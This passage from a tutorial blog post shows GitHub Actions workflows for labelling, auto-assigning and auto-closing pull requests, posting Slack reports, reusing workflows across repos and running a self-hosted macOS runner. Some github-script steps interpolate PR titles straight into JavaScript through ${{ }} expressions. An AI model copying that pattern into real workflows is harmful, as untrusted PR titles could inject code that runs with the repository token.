# Label logic if [ \"$FILE_COUNT\" -lt 5 ]; then LABEL=\"XS\" elif [ \"$FILE_COUNT\" -lt 10 ]; then LABEL=\"S\" elif [ \"$FILE_COUNT\" -lt 30 ]; then LABEL=\"M\" elif [ \"$FILE_COUNT\" -lt 80 ]; then LABEL=\"L\" elif [ \"$FILE_COUNT\" -lt 200 ]; then LABEL=\"XL\" else LABEL=\"XXL\" fi # Use GitHub API (gh CLI) to remove the current Size Label EXISTING_LABELS=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json labels --jq '.labels[].name') for EXISTING in $EXISTING_LABELS; do case \"$EXISTING\" in XS|S|M|L|XL|XXL) echo \"🧹 Removing existing label: $EXISTING\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --remove-label \"$EXISTING\" ;; esac done # (Optional) Create the label if it does not exist if ! gh label list --repo \"$REPO\" | grep -q \"^$LABEL\"; then echo \"🆕 Creating missing label: $LABEL\" gh label create \"$LABEL\" --repo \"$REPO\" --description \"Size label: $LABEL\" --color \"ededed\" else echo \"✅ Label '$LABEL' already exists\" fi # Use GitHub API (gh CLI) to label the PR gh pr edit $PR_NUMBER --repo $REPO --add-label \"$LABEL\"After committing the file to the main branch of the Repo, opening a new PR will automatically trigger GitHub Actions:The Action execution status shows Queued, indicating that the task is waiting for the Runner to take over.Execution ResultDemo PROnce completed successfully, the PR will automatically be labeled with the corresponding label! The record will show that it was labeled by github-actions.Complete Code: Automation-PullRequest.ymlDirectly Use Pre-Packaged Action Steps: pascalgn/size-label-actionAs mentioned earlier, you can directly use pre-packaged Actions. The task of labeling PR Size Labels already has a ready-made solution available. The above example is for educational purposes; in practice, you do not need to reinvent the wheel.You can simply use it directly in the Action Workflow Job Step:# Workflow(Action) Namename: Pull Request Automation# Trigger Eventson: # PR Events pull_request: # PR - Opened, Reopened, New Push Commit types: [opened, synchronize, reopened]# In the same Concurrency Group, if there is a new Job, it will cancel the one currently running# For example, if a task triggered by a Push Commit has not executed yet and another Push Commit occurs, the previous task will be canceledconcurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job Items# Jobs will run concurrentlyjobs: # Job ID label-pr-by-file-count: # Job Name (optional, omitted for better readability in logs) name: Label PR by changes file count # If this Job fails, it does not affect the entire Workflow, and other Jobs continue continue-on-error: true # Set maximum Timeout to prevent endless waiting in case of anomalies timeout-minutes: 10 # Runner Label - Use GitHub Hosted Runner ubuntu-latest to execute the job # If it's a Private Repo, usage will be calculated, and exceeding limits may incur costs runs-on: ubuntu-latest # Job Steps # Steps will execute in order steps: # Step Name - name: Get changed file count and apply label # Step ID (optional, not needed if there are no subsequent Steps to reference Output) id: get-changed-files-count-by-gh # Directly use pre-packaged code uses: \"pascalgn/size-label-action@v0.5.5\" # Inject external environment parameters into the runtime # Parameter naming and available parameters should refer to the documentation: https://github.com/pascalgn/size-label-action/tree/main env: # secrets.GITHUB_TOKEN is a Token automatically generated during GitHub Actions execution (github-actions identity), no need to set it in Secrets, it has some GitHub Repo API Scopes permissions # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GITHUB_TOKEN: \"${{ secrets.GITHUB_TOKEN }}\"This pre-packaged Action is a JavaScript Action. You can refer to the actual execution code in the following file: dist/index.js.Supplement on name and run-name: name: Name of the Action Workflow run-name: Title of the execution record (can include PR Title or Branch or Author…etc)If it is an on:pull_request event, the default is the PR Title.Case — 2Automatically assign the author to themselves and comment if there is no Assignee after creating a Pull Request. (This only executes on the initial creation.)Result ImageDemo PROperation Process User opens PR Triggers GitHub Actions Workflow GitHub script retrieves assignee If there is no assignee, assigns the author of the PR &amp; comments the message CompletedHands-On PracticeRepo → Actions → New workflow → set up a workflow yourself.File Name: Automation-PullRequest.yml (same as above)Automation-PullRequest.yml# Workflow(Action) Namename: Pull Request Automation# Actions Log Titlerun-name: \"Pull Request Automation - Daily Checker\"# Trigger Eventson: # PR Events pull_request: # PR - Opened, Reopened, New Push Commit types: [opened, synchronize, reopened]# In the same Concurrency Group, if there is a new Job, it will cancel the one currently running# For example, if a task triggered by a Push Commit has not executed yet and another Push Commit occurs, the previous task will be canceledconcurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job Items# Jobs will run concurrentlyjobs: # Job ID label-pr-by-file-count: # Please refer to the previous section, omitted.... # --------- assign-self-if-no-assignee: name: Automatically assign to self if no assignee is specified # Since this is a shared trigger event, the Job will determine itself; it will only execute when the Pull Request is Opened (initial creation), otherwise it will be Skipped if: github.event_name == 'pull_request' &amp;&amp; github.event.action == 'opened' # If this Job fails, it does not affect the entire Workflow, and other Jobs continue continue-on-error: true # Set maximum Timeout to prevent endless waiting in case of anomalies timeout-minutes: 10 # Runner Label - Use GitHub Hosted Runner ubuntu-latest to execute the job # If it's a Private Repo, usage will be calculated, and exceeding limits may incur costs runs-on: ubuntu-latest steps: - name: Assign self if No Assignee # Use GitHub Script (JavaScript) to write the script (Node.js environment) # Compared to writing directly in Shell Script, this is more convenient and visually appealing # No need to inject environment variables or GITHUB_TOKEN manually uses: actions/github-script@v7 with: script: | // In github-script, context variables are automatically injected for direct reference in JavaScript // https://docs.github.com/en/actions/learn-github-actions/contexts#github-context const issue = context.payload.pull_request; // If you want to support Issues as well, you can write it as context.payload.issue || context.payload.pull_request const assignees = issue.assignees || []; const me = context.actor; if (assignees.length === 0) { // Set Assignee to self await github.rest.issues.addAssignees({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue.number, assignees: [me] }); // Leave a comment to notify await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue.number, body: `🔧 No assignee was set, so I have assigned this to myself (@${me}).` }); }This time we demonstrate using GitHub Script (JavaScript) to write the script, which offers more flexibility and better syntax.Of course, if you want to follow my previous suggestion of having each task in a separate file, you can remove the Job If condition and directly set the Action Workflow trigger conditions:Automation-PullRequest-Auto-Assign.yml :# Workflow(Action) Namename: Pull Request Automation - Auto Assignee Self# Trigger Eventson: # PR Events pull_request: # PR - On Open types: [opened]jobs: assign-self-if-no-assignee: name: Automatically assign to self if no assignee is specified runs-on: ubuntu-latest steps: # Please refer to the previous section, omitted....After committing the file to the main branch of the Repo, opening a new PR will automatically trigger GitHub Actions:Now there are two Jobs to execute!Execution ResultDemo PROnce completed successfully, if the PR has no Assignees, it will automatically assign the PR author and comment the message. (All actions are performed under the github-actions identity)Complete Code: Automation-PullRequest.ymlTest Reopening (Reopened) PRYou can see that only the Size Label Job will execute, while the Auto Assignee Job was Skipped. This task also has a pre-packaged Action available for reuse; you can refer to: pozil/auto-assign-issue.Case — 3Automatically count the current number of PRs and how long they have been open every morning at 9 AM, sending notification messages to the Slack workgroup, and automatically closing PRs that have been open for over 3 months.Result Image Slack workgroup automatically receives reports every morning Automatically closes PRs that have been open for more than 90 daysWorkflow GitHub Actions automatically triggers every morning at 9 AM Triggers the GitHub Actions Workflow GitHub script retrieves the list of open PRs and counts how many days they have been open Sends the statistical report message to Slack Closes PRs that have been open for more than 90 days DoneGet StartedRepo → Actions → New workflow → set up a workflow yourself.File Name: Automation-PullRequest-Daily.ymlAutomation-PullRequest-Daily.yml# Workflow(Action) namename: Pull Request Automation - Daily Checker# Trigger eventson: # Scheduled to run automatically # https://crontab.guru/ # UTC time schedule: # UTC 01:00 = 09:00 UTC+8 every day - cron: '0 1 * * *' # Manual trigger workflow_dispatch:# Job tasks# Jobs will run concurrentlyjobs: # Job ID calculate-pr-status: # Job name (optional, but makes logs easier to read) name: Calculate PR Status # Runner Label - uses GitHub Hosted Runner ubuntu-latest to execute the job # If it's a Private Repo, usage will be calculated, and exceeding limits may incur costs runs-on: ubuntu-latest # Job Output outputs: pr_list: ${{ steps.pr-info.outputs.pr_list }} # Job steps # Steps will execute in order steps: # Step name - name: Fetch open PRs and calculate # Step needs to reference Output, must be set id: pr-info uses: actions/github-script@v7 with: script: | const now = new Date(); const per_page = 100; let page = 1; let allPRs = []; while (true) { const { data: prs } = await github.rest.pulls.list({ owner: context.repo.owner, repo: context.repo.repo, state: 'open', per_page, page, }); if (prs.length === 0) break; allPRs = allPRs.concat(prs); if (prs.length &lt; per_page) break; page++; } const result = allPRs.map(pr =&gt; { const created = new Date(pr.created_at); const daysOpen = Math.floor((now - created) / (1000 * 60 * 60 * 24)); return { pr: pr.number.toString(), title: pr.title, idle: daysOpen }; }); // Set back to Output, only accepts String core.setOutput('pr_list', JSON.stringify(result)); # ---- send-pr-summary-message-to-slack: name: Send PR Summary Message to Slack # By default, Jobs run concurrently; using needs forces the current Job to wait until the needed Job completes needs: [calculate-pr-status] runs-on: ubuntu-latest steps: - name: Generate Message # Step needs to reference Output, must be set id: gen-msg uses: actions/github-script@v7 with: script: | const prList = JSON.parse(`${{ needs.calculate-pr-status.outputs.pr_list }}`); const blocks = []; // Title blocks.push({ type: \"section\", text: { type: \"mrkdwn\", text: `📬 *Open PR Report*\\nTotal: *${prList.length}* PR(s)` } }); // Each PR in a line for (const pr of prList) { blocks.push({ type: \"section\", text: { type: \"mrkdwn\", text: `• &lt;https://github.com/${context.repo.owner}/${context.repo.repo}/pull/${pr.pr}|PR #${pr.pr}&gt; *${pr.title}* - 🕒 ${pr.idle} day(s)` } }); } // Set back to Output, only accepts String core.setOutput('blocks', JSON.stringify(blocks)); # Use the official Slack API GitHub Actions # https://tools.slack.dev/slack-github-action/sending-techniques/sending-data-slack-api-method/ # Send message - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} blocks: ${{ steps.gen-msg.outputs.blocks }} # ---- auto-close-old-prs: name: Auto Close Old PRs needs: [calculate-pr-status] runs-on: ubuntu-latest steps: - name: Auto close PRs opened more than 90 days uses: actions/github-script@v7 with: script: | const prList = JSON.parse(`${{ needs.calculate-pr-status.outputs.pr_list }}`); const oldPRs = prList.filter(pr =&gt; pr.idle &gt; 90); for (const pr of oldPRs) { await github.rest.pulls.update({ owner: context.repo.owner, repo: context.repo.repo, pull_number: parseInt(pr.pr), state: 'closed' }); await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: parseInt(pr.pr), body: `⚠️ This pull request has been automatically closed because it has been open for more than 90 days. Please reopen if needed.` }); } console.log(`Closed ${oldPRs.length} PR(s)`);In this example, we use: on: schedule Crontab to automatically trigger and workflow_dispatch to support manual triggering Job output/Step output (both can only be strings) Multiple Jobs are concurrent by default but can use needs for time dependency Retrieve settings from Repo Secrets/Variables Integrate with Slack APIRepo Secrets — Add SLACK_BOT_TOKEN For creating a Slack App and setting message permissions, you can refer to my previous articleRepo Variables — Add SLACK_TEAM_CHANNEL_IDAfter committing the file to the main branch of the Repo, return to Actions and manually trigger it: It will automatically trigger daily in the future.Actions → Pull Request Automation — Daily Checker → Run workflow → Branch: main → Run workflow.After execution, you can click to view the execution status:Due to the needs constraint, the Jobs process will have Calculate PR Status complete first before concurrently executing Auto Close Old PRs and Send PR Summary Message to Slack.Execution ResultsAfter all tasks successfully execute, you can check the Slack message:Success 🚀🚀🚀Full code: Automation-PullRequest-Daily.ymlSummary I hope the three examples above give you a preliminary understanding of GitHub Actions and inspire your automation workflow ideas. You can come up with your own workflows (please be sure to refer to trigger events), and then write scripts to execute; also remember to check the Marketplace for existing steps that you can use directly.This article is just an introduction (even without checking out code). The next article, “CI/CD Practical Guide (3): Implementing CI and CD Workflows for App Projects Using GitHub Actions”, will introduce more complex and in-depth GitHub Actions Workflows.GitHub Automation Extension TopicsGitHub can integrate with Slack to subscribe to Repo PR update notifications, Push Default Branch notifications, etc.Question 1. GitHub messages cannot tag people, only tagging GitHub accounts, and Slack accounts do not receive notifications:Slack App or search for GitHub in Apps → open the message window → complete the Connect GitHub Account step, so GitHub knows what your corresponding Slack UID is and can tag you.Question 2. Pull Request ReminderI remember this was originally a feature developed by a third party, but it was later integrated directly into GitHub. Don’t foolishly write scripts using GitHub Actions for this! GitHub has a built-in by Team setting; you need to first add a Team for the organization, add the Repo to the Team, and then you can set up Pull Request Reminders. After entering the Slack Channel and rules, it will automatically send reminder messages and tag Reviewers every day. You can refer to the setup here, and the result is shown in the image below:https://michaelheap.com/github-scheduled-reminders/Question 4. GitHub PR messages, authors do not receive notifications: This is a long-standing issue: the PR Slack message actually does not notify the author when someone replies in threads. The Slack message sent by GitHub only tags Reviewers, not the Assignee or PR author.At this point, GitHub Actions can be used to create an automation tool. We can add a Job to append the author tag at the end of the PR Description, so that when the message is sent to Slack, it will also tag the author’s Slack:# Workflow(Action) namename: Pull Request Automation# Please refer to the previous text, omitted.... # --------- append-author-to-pr-description: name: Append author to PR description # Since this is a shared trigger event, the Job will determine itself; it will only execute the Job when the Pull Request is Opened (first created), otherwise it will be Skipped if: github.event_name == 'pull_request' &amp;&amp; github.event.action == 'opened' # If this Job fails, it does not affect the entire Workflow, and other Jobs will continue continue-on-error: true # Set the maximum Timeout duration to prevent endless waiting in case of anomalies timeout-minutes: 10 # Runner Label - uses GitHub Hosted Runner ubuntu-latest to execute the job # If it's a Private Repo, usage will be calculated, and exceeding limits may incur costs # But this kind of automation task is not likely to exceed usage runs-on: ubuntu-latest steps: - name: Append author to PR description env: # secrets.GITHUB_TOKEN is a token automatically generated during GitHub Actions execution, no need to set it in Secrets, it has some GitHub Repo API Scopes permissions # gh (GitHub) CLI needs to inject GH_TOKEN into ENV for permission to operate # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # ${{ github.xxx }} is a GitHub Actions Context expression # It is not a Shell variable, but a value replaced by GitHub Actions during the YAML parsing phase # Other parameters: https://docs.github.com/en/actions/learn-github-actions/contexts#github-context PR_NUMBER: ${{ github.event.pull_request.number }} AUTHOR_TAG: '@${{ github.event.pull_request.user.login }}' run: | PR_BODY=$(gh pr view $PR_NUMBER --repo ${{ github.repository }} --json body -q \".body\") NEW_BODY=$(printf \"%s\\n\\nCreated by %s\" \"$PR_BODY\" \"$AUTHOR_TAG\") gh pr edit $PR_NUMBER --repo ${{ github.repository }} --body \"$NEW_BODY\"Full code: Automation-PullRequest.ymlWhen opening a PR, it will automatically append the author information at the end of the description, and the Slack message will correctly tag the author:Question 5. GitHub sends too many notification emails, which is very disruptive:After setting up GitHub Repo notifications and Slack, you can go to your GitHub personal settings to turn off email notifications:OthersActions currently do not have a directory structure, but you can pin (Pin) five Actions on the Actions page; you can also use Disable to pause a specific Action.You can check GitHub Actions usage and execution performance in Insights:Reuse Workflow SupplementThe next article uses the same Repo to split Reuse Workflow; here’s a supplement on an example of splitting Reuse Workflow across different Repos.First, define a Reuse Workflow: Automation-label-pr-base-branch.yml: in the ZhgChgLi/github-actions-ci-cd-demo-share-actions Repo.name: Automation-label-pr-base-branchrun-name: \"[Automation-label-pr-base-branch] ${{ github.event.inputs.PR_NUMBER || github.ref }}\"concurrency: group: ${{ github.workflow }}-${{ github.event.inputs.PR_NUMBER || github.ref }} cancel-in-progress: true# Trigger eventson: # Other Workflows call this Workflow to trigger workflow_call: # Input data inputs: # PR Number PR_NUMBER: required: true type: string # Secret inputs secrets: GH_TOKEN: description: \"GitHub token for API access\" required: truejobs: label-pr-base-branch: name: Label PR Base Branch continue-on-error: true timeout-minutes: 10 runs-on: ubuntu-latest steps: - name: Label PR by Base Branch id: label-pr-base-branch env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: | PR_NUMBER=\"${{ inputs.PR_NUMBER }}\" REPO=\"${{ github.repository }}\" echo \"📦 Processing PR #$PR_NUMBER in repo $REPO\" # Get the base branch of the PR BASE_BRANCH=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json baseRefName --jq '.baseRefName') echo \"🔖 PR Base Branch: $BASE_BRANCH\" # Allowed base branch labels BRANCH_LABELS=(\"develop\" \"main\" \"master\") # Check if the label is in the allowed list if [[ \" ${BRANCH_LABELS[@]} \" =~ \" ${BASE_BRANCH} \" ]]; then LABEL=\"$BASE_BRANCH\" else echo \"⚠️ Base branch '$BASE_BRANCH' not in allowed list, skipping label.\" exit 0 fi # Remove existing base branch labels EXISTING_LABELS=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json labels --jq '.labels[].name') for EXISTING in $EXISTING_LABELS; do if [[ \" ${BRANCH_LABELS[@]} \" =~ \" ${EXISTING} \" ]]; then echo \"🧹 Removing existing base branch label: $EXISTING\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --remove-label \"$EXISTING\" fi done # Create the label if it doesn't exist if ! gh label list --repo \"$REPO\" | grep -q \"^$LABEL$\"; then echo \"🆕 Creating missing label: $LABEL\" gh label create \"$LABEL\" --repo \"$REPO\" --description \"PR targeting $LABEL branch\" --color \"ededed\" else echo \"✅ Label '$LABEL' already exists\" fi # Add the base branch label echo \"🏷️ Adding label '$LABEL' to PR #$PR_NUMBER\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --add-label \"$LABEL\"Returning to our main ZhgChgLi/github-actions-ci-cd-demo repo, we will add a main workflow Demo-Reuse-Action-From-Another-Repo.yml:name: Automation-label-pr-base-branchon: pull_request: types: [opened]jobs: call-label-pr-workflow: name: Call Base Branch Label Workflow # ✅ If the called workflow is in the same repo: # uses: ./.github/workflows/Automation-label-pr-base-branch.yml # Note: This syntax cannot specify branches (it always uses the caller workflow's branch) # Reference examples: # - CD-Deploy-Form.yml calls this repo workflow # - CD-Deploy.yml calls cross-repo workflow # # ✅ If the called workflow is in another repo: # uses: {owner}/{repo}/.github/workflows/{file}.yml@{branch_or_tag} # You can specify branch or tag # ref: https://github.com/ZhgChgLi/github-actions-ci-cd-demo-share-actions/blob/main/.github/workflows/Automation-label-pr-base-branch.yml uses: ZhgChgLi/github-actions-ci-cd-demo-share-actions/.github/workflows/Automation-label-pr-base-branch.yml@main with: PR_NUMBER: ${{ github.event.number }} # If all secrets need to inherit from the caller workflow, use `inherit` # secrets: inherit # # If only specific secrets need to be passed, specify them individually secrets: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}Try opening a PR after committing the file.Workflow: Main Repo’s Demo-Reuse-Action-From-Another-Repo.yml → Calls and passes parameters to another Repo’s Automation-label-pr-base-branch.yml to execute tasks → Returns to the main Repo to report results.Success!Private Repo Access IssuesHere, we need to note a security issue: Public Repos have no problems, but if the Reuse Workflow is within a Private Repo, access is only possible if it is within the same organization + the other Repo is also Private + permissions are set to allow = to access and use the Private Repo Reuse Workflow. Public — ZhgChgLi/ReuseRepo + Private or Public — ZhgChgLi or harry/myRepo = ✅ Private — ZhgChgLi/ReuseRepo + Private or Public — harry/myRepo = ❌ Private — ZhgChgLi/ReuseRepo + Public — ZhgChgLi/anotherRepo = ❌ Private — ZhgChgLi/ReuseRepo + Private — ZhgChgLi/anotherRepo = ✅To set permissions, go to the Reuse Workflow Repo → Settings → Actions → General → Access:Change the selection to:Accessible from repositories in the 'ZhgChgLi' organizationWorkflows in other repositories that are part of the 'ZhgChgLi' organization can access the actions and reusable workflows in this repository. Access is allowed only from private repositories.Click “Save” to complete.If you do not have permission to access, the following error message will appear:Invalid workflow file: .github/workflows/Demo-reuse-action-from-another-repo.yml#L21error parsing called workflow\".github/workflows/Demo-reuse-action-from-another-repo.yml\"-&gt; \"ZhgChgLi/github-actions-ci-cd-demo-share-actions/.github/workflows/Automation-label-pr-base-branch.yml@main\": workflow was not found.GitHub Actions Script Syntax SupplementHere’s a supplement regarding the ${{ XXX }} or ${XXX} or $XXX variable syntax that might confuse some.Demo-Env-Vars- .yml:name: Demo-Env-Varson: workflow_dispatch:jobs: print-env-vars: runs-on: ubuntu-latest steps: - name: print-env run: env - name: context-vars-vs-vars env: SAY_MY_NAME: \"Heisenberg\" # GitHub Actions Context expression, as explained below FROM_REF: \"${{ github.ref }}\" run: | # Shell Script: # Referencing custom injected ENV variable content # ${SAY_MY_NAME} or $SAY_MY_NAME both work # ${XX} is more useful for string concatenation: echo \"HI: ${SAY_MY_NAME}\" # 💡 GitHub Actions Context expression # This is not a shell variable, but a value replaced by GitHub Actions during the YAML parsing phase # ⚠ Will fail if executed locally or outside of GitHub Actions environment # 🔗 https://docs.github.com/en/actions/learn-github-actions/contexts#github-context BRANCH_NAME_FROM_CONTEXT=\"${{ github.ref }}\" # 💡 GitHub Actions runtime environment variables # These variables are automatically injected by GitHub Actions when the runner executes the shell # ✅ In other environments, you can use export or ENV to predefine the same variables # 🔗 https://docs.github.com/en/actions/learn-github-actions/environment-variables BRANCH_NAME_FROM_ENV_VARS=\"${GITHUB_REF}\" echo \"FROM_REF: ${FROM_REF}\" echo \"BRANCH_NAME_FROM_CONTEXT: ${BRANCH_NAME_FROM_CONTEXT}\" echo \"BRANCH_NAME_FROM_ENV_VARS: ${BRANCH_NAME_FROM_ENV_VARS}\" - name: print-github-script-env uses: actions/github-script@v7 env: SAY_MY_NAME: \"Heisenberg\" # GitHub Actions Context expression, as explained above FROM_REF: \"${{ github.ref }}\" with: script: | // GitHub Script: (JavaScript (Node.js)): // Retrieve ENV values from process.env console.log(`HI: ${process.env.SAY_MY_NAME}`); console.log(`FROM_REF: ${process.env.FROM_REF}`); // In github-script, context variables are automatically injected for direct reference in JavaScript // https://docs.github.com/en/actions/learn-github-actions/contexts#github-context const branch_name_from_context_vars = context.ref; console.log(`branch_name_from_context_vars: ${branch_name_from_context_vars}`); // You can also use GitHub Actions Context expression (though it’s not very meaningful): const branch_name_from_context = \"${{ github.ref }}\"; console.log(`branch_name_from_context: ${branch_name_from_context}`); for (const [key, value] of Object.entries(process.env)) { console.log(`${key}=${value}`); } // The github object in github-script is an Octokit REST API instance // Used to interact with the GitHub API // For example: // await github.rest.pulls.list({ // owner: context.repo.owner, // repo: context.repo.repo, // state: \"open\" // }); # gh CLI does NOT use GITHUB_TOKEN by default; requires GH_TOKEN - name: gh CLI without GH_TOKEN (expected to fail) continue-on-error: true run: | PR_COUNT=$(gh pr list --repo $GITHUB_REPOSITORY --json number --jq 'length') echo \"Found $PR_COUNT open pull requests\" - name: gh CLI with GH_TOKEN (expected to succeed) env: # Assign GH_TOKEN so gh CLI can authenticate # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: | PR_COUNT=$(gh pr list --repo $GITHUB_REPOSITORY --json number --jq 'length') echo \"Found $PR_COUNT open pull requests\" - name: github-script auto-authentication (no GH_TOKEN needed) uses: actions/github-script@v7 with: script: | // github = Octokit REST client (auto-authenticated with GITHUB_TOKEN) const pulls = await github.rest.pulls.list({ owner: context.repo.owner, repo: context.repo.repo, state: \"open\" }); console.log(`Found ${pulls.data.length} open pull requests`);${ { XXX } } GitHub Actions Context Expression ${{ XXX }} is a GitHub Actions Context expression, which is replaced by GitHub Actions with the corresponding value during the YAML parsing phase (as shown in the above image BRANCH_NAME_FROM_CONTEXT) For a complete list of usable expressions, refer to the official documentation here ${XXX} or $XXX are real environment variables, and ${XXX} is more useful for string concatenation GitHub Actions automatically injects some environment variables; for a complete list, refer to the official documentation hereactions/github-script@v7 In github-script, you can also use ${{ XXX }} as a GitHub Actions Context expression, but it’s not very meaningful; because in the github-script environment, context variables are automatically injected for direct reference in JavaScript The github object in github-script is an Octokit REST API instance github-script can also inject variables from env:, but you need to access them using ${process.env.xxx} Some environment variables are also automatically injected; for a complete list, refer to the official documentation here using ${process.env.xxx}; but since context variables are already available, accessing them from there is not very meaningful. github-script automatically includes github-token, no need to specify.gh cli GH_TOKEN When using gh cli in GitHub Actions Shell Script, you need to specify the GH_TOKEN parameter. You can directly use the default Token — secrets.GITHUB_TOKEN (automatically generated during GitHub Actions execution). The default Token has some basic permissions; if the command you want to execute does not have enough permissions, you will need to use a Personal Access Token. It is recommended to create a PAT using a shared account for team use.Complete code: Demo-Env-Vars- .ymlGitHub Actions has been developed; the next step is to replace the GitHub Hosted Runner with our own Self-hosted Runner. GitHub Hosted Runner has a free quota of 2,000 minutes per month (starting), running such small automation tasks doesn’t take much time, and since it runs on Linux machines, the cost is very low, possibly not even reaching the free limit; there’s no need to switch to a Self-hosted Runner. Changing the Runner also requires ensuring the Runner environment is correct (for example, GitHub Hosted Runner comes with gh cli, while self-hosted Runner needs to have it installed properly), this article is purely for educational purposes to demonstrate the switch. If it’s for executing CI/CD tasks, then using a Self-hosted Runner is necessary.Adding a Self-hosted Runner This article uses macOS M1 as an example. Settings → Actions → Runners → New self-hosted runner. Runner image: macOS Architecture: For M1, remember to select ARM64 for faster execution.Open a Terminal on your physical computer.Follow the Download steps to complete on your local computer:# Create a Runner directory at your desired pathmkdir actions-runner &amp;&amp; cd actions-runner# Download the Runner imagecurl -o actions-runner-osx-x64-2.325.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.325.0/actions-runner-osx-x64-2.325.0.tar.gz# Optional: Validate the hashecho \"0562bd934b27ca0c6d8a357df00809fbc7b4d5524d4aeb6ec152e14fd520a4c3 actions-runner-osx-x64-2.325.0.tar.gz\" | shasum -a 256 -c# Unziptar xzf ./actions-runner-osx-x64-2.325.0.tar.gz The above is just a reference; it is recommended to follow the steps on your settings page to ensure you have the latest version of the Runner image.Configure Settings:# Please refer to the commands on the settings page; the token will change over time./config.sh --url https://github.com/ORG/REPO --token XXXYou will be prompted to enter: Enter the name of the runner group to add this runner to: [press Enter for Default] Just press Enter*Only runners registered at the organization level will have the group feature. Enter the name of runner: [press Enter for ZhgChgLideMacBook-Pro] You can enter a desired runner name e.g. app-runner-1 or just press Enter This runner will have the following labels: ‘self-hosted’, ‘macOS’, ‘X64’Enter any additional labels (ex. label-1,label-2): [press Enter to skip] Enter the desired runner label; you can add multiple custom labels for easier future use. As mentioned earlier, GitHub Actions/Runner finds tasks based on corresponding labels, if you only use the default label, the runner may pick up other runners in the organization to execute jobs, so it’s safest to create a custom one. I randomly set a label self-hosted-zhgchgli. Enter name of work folder: [press Enter for _work] Just press EnterWhen you see √ Settings Saved, it means the setup is complete.Start the Runner:./run.shWhen you see √ Connected to GitHub, Listening for Jobs, it means it is now listening for Actions tasks: This Terminal window must remain open to continuously receive tasks. 🚀🚀🚀 You can open multiple Terminals on the same computer in different directories to run multiple Runners.Returning to the Repo settings page, you can also see the Runner waiting for tasks:Status: Idle: Waiting for tasks Active: A task is currently running Offline: Runner is not onlineWorkflow (GitHub Actions) Runner Switching to Self-hosted RunnerTaking Automation-PullRequest.yml as an example:# Please refer to the previous text, omitted....jobs: label-pr-by-file-count: # Please refer to the previous text, omitted.... runs-on: [self-hosted-zhgchgli] # Please refer to the previous text, omitted.... # --------- assign-self-if-no-assignee: # Please refer to the previous text, omitted.... runs-on: [self-hosted-zhgchgli] steps: # Please refer to the previous text, omitted....After committing the file to the main branch of the repo, reopen the PR to trigger the validation of Actions.Back in the Runner Terminal, you can see that a new task has come in and is currently executing with the execution results:It failed because my local computer does not have the gh cli environment installed:After installing gh on the physical computer using brew install gh, I triggered the execution again:Success! Now this task is completely running on our own computer, without using GitHub Hosted Runner, and without incurring costs.We can click into the Action Log to see which Runner and machine the task is executing on:runs-on: [ Runner Label SettingHere it is AND, not OR; GitHub Runner does not currently support OR selection of Runners for execution.For example: [self-hosted, macOS, app] → means the Runner must have all three Labels self-hosted, macOS, app to match and take on the task for execution.If a Job wants to test results under different Runner environments simultaneously, you can use the matrix parameter:jobs: test: runs-on: ${{ matrix.runner }} strategy: matrix: runner: - [self-hosted, linux, high-memory] - [self-hosted, macos, xcode-15] steps: - run: echo \"Running on ${{ matrix.runner }}\"This way, this Job will run once in parallel on the following two Runner Labels: self-hosted, linux, high-memory self-hosted, macos, xcode-15 Currently, Runner does not support: - OR selection of Runners - Runner weight settingsRegistering Runner as a ServiceYou can refer to the official documentation on “Configuring the self-hosted runner application as a service” to register the Runner directly as a system Service, allowing it to run in the background (without opening Terminal in the foreground) and automatically start after booting.If you have multiple Runners, remember to adjust the “Customizing the self-hosted runner service” settings to register different names. I have a pending issue to research regarding iOS, which is that after switching to the background Service, I encountered an error during Archive (suspected to be related to keychain permissions). At that time, I didn’t have time to resolve it, so I continued using the foreground Terminal Runner.If you want to achieve automatic startup on boot in the traditional foreground way, you need to add an automatic startup configuration file in ~/Library/LaunchAgents:actions.runner.REPO.RUNNER_NAME.plist:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;&lt;plist version=\"1.0\"&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;actions.runner.REPO.RUNNER_NAME&lt;/string&gt; &lt;!-- Specify Terminal.app to start --&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/open&lt;/string&gt; &lt;string&gt;-a&lt;/string&gt; &lt;string&gt;Terminal&lt;/string&gt; &lt;string&gt;/Users/zhgchgli/Documents/actions-runner/run.sh&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;WorkingDirectory&lt;/key&gt; &lt;string&gt;/Users/zhgchgli/Documents/actions-runner&lt;/string&gt; &lt;/dict&gt;&lt;/plist&gt; For those interested in delving deeper into DevOps, you can refer to the official k8s Runner documentation.Complete Project RepoOfficial DocumentationFor more detailed setup methods, be sure to refer to the official manual.AI Can Help!In practice, providing ChatGPT with the complete steps and timing can help you write GitHub Actions ready for direct use!SummaryNow you should have a certain understanding of GitHub Actions + Self-hosted Runner. In the next article, I will start building the entire 